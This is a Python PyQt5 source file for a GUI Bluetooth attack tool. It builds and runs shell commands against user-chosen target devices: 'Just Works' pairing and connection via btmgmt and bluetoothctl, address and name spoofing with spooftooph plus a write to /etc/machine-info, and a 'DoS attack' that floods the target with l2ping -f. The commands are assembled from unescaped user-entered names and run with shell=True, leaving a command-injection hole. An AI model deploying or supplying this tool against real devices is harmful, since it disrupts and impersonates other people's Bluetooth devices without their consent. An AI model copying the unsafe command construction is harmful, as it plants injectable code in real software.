#!/usr/bin/env python3

from PyQt5 import QtCore, QtGui, QtWidgets
from build.main_gui import Ui_MainWindow
from build.add_device_dialog import Ui_Dialog_AddDevice
from build.pair_device_dialog import Ui_Dialog_PairDevice
from build.spoof_device_dialog import Ui_Dialog_SpoofDevice
from build.dos_attack_dialog import Ui_Dialog_dos_attack
from subprocess import Popen, PIPE


class MainProgram(QtWidgets.QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):

        # setup GUI
        super(MainProgram, self).__init__(parent)
        self.cmd_list = ['ls']
        self.setupUi(self)

        # Run button onclick listener
        self.run_btn.clicked.connect(lambda: self.run_cmd())

        # Clear button onclick listener
        self.clear_btn.clicked.connect(lambda: self.taskListWidget.clear())

        # (+) button onclcik listener
        self.add_device_btn.clicked.connect(self.onAddDeviceBtnClicked)

        # BT address listview
        self.addrListWidget.installEventFilter(self)

        # Tastk listview
        # self.taskListWidget.installEventFilter(self)

    def eventFilter(self, source, event):
        if(event.type() == QtCore.QEvent.ContextMenu and source is self.addrListWidget):
            item = source.itemAt(event.pos())
            if(item != None):
                obj = item.data(QtCore.Qt.UserRole)
                menu = QtWidgets.QMenu()

                # Pair Action
                pair_action = QtWidgets.QAction(
                    "Pair (Just Work) + Connect", self)
                pair_action.triggered.connect(
                    lambda: self.onActionTriggered("pair", obj))

                # Spoof Action
                spoof_action = QtWidgets.QAction("Spoof", self)
                spoof_action.triggered.connect(
                    lambda: self.onActionTriggered("spoof", obj))

                # Dos Action
                dos_atk_action = QtWidgets.QAction("Dos attack", self)
                dos_atk_action.triggered.connect(
                    lambda: self.onActionTriggered("dos_atk", obj))

                menu.addAction(spoof_action)
                menu.addAction(pair_action)
                menu.addAction(dos_atk_action)
                menu.exec_(event.globalPos())
                return True

        return super(MainProgram, self).eventFilter(source, event)

    def onActionTriggered(self, type, obj):
        if type == "pair":
            dialog = PairDeviceDialog(self)
            if dialog.exec_():
                hci = dialog.hCILineEdit.text()
                transport = str(dialog.transportComboBox.currentText())
                obj['transport'] = transport
                obj['hci'] = hci
                # io_cap = dialog.iOCapLineEdit.text()
                self.addTaskToList({
                    "task": "pair",
                    "hci": hci,
                    "target": obj['bt_addr'] + "(" + obj['name'] + ")",
                    "transport": transport,
                    "cmds": self.pair(obj)})
        elif type == "spoof":
            dialog = SpoofDeviceDialog(self)
            if dialog.exec_():
                hci = dialog.hCILineEdit.text()
                obj['hci'] = hci
                self.addTaskToList({
                    "task": "spoof",
                    "hci": hci,
                    "target": obj['bt_addr'] + " (" + obj['name'] + ")",
                    "cmds": self.spoof(obj)})
        elif type == "dos_atk":
            dialog = DosAttackDialog(self)
            if dialog.exec_():
                hci = dialog.hCILineEdit.text()
                obj['hci'] = hci
                self.addTaskToList({
                    "task": "dos_atk",
                    "hci": hci,
                    "target": obj['bt_addr'],
                    "cmds": self.dos_atk(obj)})

    def onAddDeviceBtnClicked(self):
        # Laucn the add device dialog
        dialog = AddDeviceDialog(self)
        if dialog.exec_():
            addr = dialog.bTAddressLineEdit.text()
            name = dialog.deviceNameLineEdit.text()
            self.addAddrToList(addr, name)

    def addTaskToList(self, obj):
        item = QtWidgets.QListWidgetItem()
        item.setFlags(QtCore.Qt.NoItemFlags)
        frame = QtWidgets.QFrame()
        frame.setFrameStyle(QtWidgets.QFrame.Panel | QtWidgets.QFrame.Raised)
        layout = QtWidgets.QFormLayout()
        if obj['task'] == "pair":
            layout.addRow(QtWidgets.QLabel("Task:"),
                          QtWidgets.QLabel("Pair (Just Work) + Connect"))
            layout.addRow(QtWidgets.QLabel("HCI:"),
                          QtWidgets.QLabel(obj['hci']))
            layout.addRow(QtWidgets.QLabel("Target:"),
                          QtWidgets.QLabel(obj['target']))
            layout.addRow(QtWidgets.QLabel("Transport:"),
                          QtWidgets.QLabel(obj['transport']))
        elif obj['task'] == "spoof":
            layout.addRow(QtWidgets.QLabel("Task:"),
                          QtWidgets.QLabel("BT address Spoofing"))
            layout.addRow(QtWidgets.QLabel("HCI:"),
                          QtWidgets.QLabel(obj['hci']))
            layout.addRow(QtWidgets.QLabel("Target:"),
                          QtWidgets.QLabel(obj['target']))
        elif obj['task'] == "dos_atk":
            layout.addRow(QtWidgets.QLabel("Task:"),
                          QtWidgets.QLabel("DoS Attack"))
            layout.addRow(QtWidgets.QLabel("HCI:"),
                          QtWidgets.QLabel(obj['hci']))
            layout.addRow(QtWidgets.QLabel("Target:"),
                          QtWidgets.QLabel(obj['target']))
        frame.setLayout(layout)

        # change size of "item" according to it's content
        item.setSizeHint(frame.sizeHint())
        item.setData(QtCore.Qt.UserRole, obj['cmds'])
        self.taskListWidget.addItem(item)
        self.taskListWidget.setItemWidget(item, frame)

    def addAddrToList(self, addr, name):
        item = QtWidgets.QListWidgetItem(addr + " (" + name + ")")
        item.setData(QtCore.Qt.UserRole, {"bt_addr": addr, "name": name})
        self.addrListWidget.addItem(item)

    def run_cmd(self):
        for i in range(self.taskListWidget.count()):
            cmd_list = self.taskListWidget.item(i).data(QtCore.Qt.UserRole)
            for cmd in cmd_list:
                self.console_output.append(
                    "<span style=\'color:#ffff00;'> running: " +
                    cmd.replace(" | sed -e 's/\\x01\\x1b\[.\{1,5\}m\\x02//g'", "") + "</span>")
                self.console_output.repaint()
                p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
                out, err = p.communicate()
                self.console_output.append(str(out, 'ascii').rstrip())
                self.console_output.append(str(err, 'ascii').rstrip())
                self.console_output.repaint()
        self.console_output.append("Finished")

    def pair(self, obj):
        if obj['transport'] == "BR/EDR":
            transport_code = "0x00"
        else:
            transport_code = "0x02"

        return ["btmgmt -i " + obj['hci'] + " pair -c 0x03 -t " + transport_code + " " + obj['bt_addr'] + " | sed -e 's/\\x01\\x1b\[.\{1,5\}m\\x02//g'",
                "bluetoothctl select $(hcitool dev | grep " + obj['hci'] + " | grep -o '[[:xdigit:]:]\{11,17\}')" + " | sed -e 's/\\x01\\x1b\[.\{1,5\}m\\x02//g'",
                "bluetoothctl trust " +
                obj['bt_addr'] + " | sed -e 's/\\x01\\x1b\[.\{1,5\}m\\x02//g'",
                "bluetoothctl connect " + obj['bt_addr'] + " | sed -e 's/\\x01\\x1b\[.\{1,5\}m\\x02//g'"]

    def spoof(self, obj):
        return ["spooftooph -i " + obj['hci'] + " -a " + obj['bt_addr'] + " -n '" + obj['name'] + "' | sed -e 's/\\x01\\x1b\[.\{1,5\}m\\x02//g'",
                "echo 'PRETTY_HOSTNAME=" +
                obj['name'] + "' > /etc/machine-info",
                "service bluetooth restart",
                "btmgmt -i " + obj['hci'] + " bondable on",
                "hciconfig " + obj['hci'] + " up",
                "hciconfig " + obj['hci'] + " piscan" + " | sed -e 's/\\x01\\x1b\[.\{1,5\}m\\x02//g'"]

    def dos_atk(self, obj):
        return ["l2ping -i " + obj['hci'] + " -s 251 -f " + obj['bt_addr'] + " | sed -e 's/\\x01\\x1b\[.\{1,5\}m\\x02//g'"]


class AddDeviceDialog(QtWidgets.QDialog, Ui_Dialog_AddDevice):
    # Add device dialog, add mainwindow as parent
    def __init__(self, parent):
        super(AddDeviceDialog, self).__init__(parent)
        self.setupUi(self)


class PairDeviceDialog(QtWidgets.QDialog, Ui_Dialog_PairDevice):
    # Add device dialog, add mainwindow as parent
    def __init__(self, parent):
        super(PairDeviceDialog, self).__init__(parent)
        self.setupUi(self)


class SpoofDeviceDialog(QtWidgets.QDialog, Ui_Dialog_SpoofDevice):
    # Spoof device dialog, add mainwindow as parent
    def __init__(self, parent):
        super(SpoofDeviceDialog, self).__init__(parent)
        self.setupUi(self)


class DosAttackDialog(QtWidgets.QDialog, Ui_Dialog_dos_attack):
    # Dos attack dialog, add mainwindow as parent
    def __init__(self, parent):
        super(DosAttackDialog, self).__init__(parent)
        self.setupUi(self)


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    window = MainProgram()
    window.show()
    sys.exit(app.exec_())
